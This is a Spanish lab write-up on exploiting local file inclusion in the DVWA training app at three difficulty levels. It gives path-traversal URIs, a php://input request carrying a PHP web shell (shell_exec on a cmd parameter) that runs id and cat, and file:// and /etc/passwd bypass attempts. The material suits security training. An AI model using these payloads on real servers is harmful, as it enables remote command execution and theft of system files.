# LFI

## Bajo

Sabiendo que el archivo `fi.php` existe, podemos intentar leerlo con la siguiente URI:
```
http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![Path Traversal](/FI/assets/primerPaso.png)
Como se puede observar en la imágen, el archivo `fi.php` es leído y mostrado en la página aunque no hemos conseguido leer las 5 citas que contiene.

Para intetar leer el archivo completo, podemos intentar ejecutar commandos en el servidor, para ello nos ayudaremos de Burp Suite, que nos permitirá modificar la petición que se envía al servidor.

Como primera prueba realizamos una petición GET a la URI para obtener información sobre el servidor:

> **Nota:** Burp Suite debe tener la opcion `Intercept is on` activada para poder modificar las peticiones.

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=id
```

una vez interceptada la petición, podemos modificarla para que se envíe un comando al servidor, para ello añadimmos el siguiente comando al final de la petición y a continuación pulsamos `Forward`:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![intercept](/FI/assets/intercept.png)

como podemos observar en la imágen, el servidor nos devuelve la información del usuario que está ejecutando el servidor web.

![forward](/FI/assets/forward.png)

Una vez comprobado podemos ejecutar comandos en el servidor, podemos intentar leer el archivo `fi.php` de la misma manera:

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=cat%20/var/www/html/DVWA/hackable/flags/fi.php
```

![challenge](/FI/assets/challenge.png)

## Medio

Realizamos la misma prueba que en el nivel bajo con la URI que conseguia mostrar el contenido del archivo `fi.php`:

```
http://localhost/DVWA/vulnerabilities/fi/?page=php://input&cmd=cat%20/var/www/html/DVWA/hackable/flags/fi.php
```    

Al igual que antes, añadimos la siguiente linea código al final de la petición, de tal manera que ejecute el comando `cat` para leer el archivo `fi.php` y lo muestre en la página.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![lfi-m](/FI/assets/lfi-m.png)

Una vez modificada la petición, pulsamos `Forward` para enviarla al servidor y obtener el contenido del archivo `fi.php`.

![challenge-2](/FI/assets/challenge-2.png)

## Alto

Al contrario que en los niveles anteriores, en este nivel no podemos modificar la petición que se envía al servidor para obtener ejecución remota de comandos, por lo que tendremos que encontrar otra forma de leer el archivo `fi.php`.

Para comprobar que no podemos modificar la petición, se han realizado distintas pruebas sobre la URI para intentar bypassar el filtro de entrada de datos, pero ninguna de ellas ha funcionado.

```
...?page=php://input&cmd=id
...?page=filephp://input&cmd=id
...?page=file php://input&cmd=id
...?page=file:///etc/passwd&php://input&cmd=id
```

Lo máximo que se ha posido obtener ha sido gracias al wrapper `file://`.

```
http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
```

![challenge-3](/FI/assets/challenge-3.png)
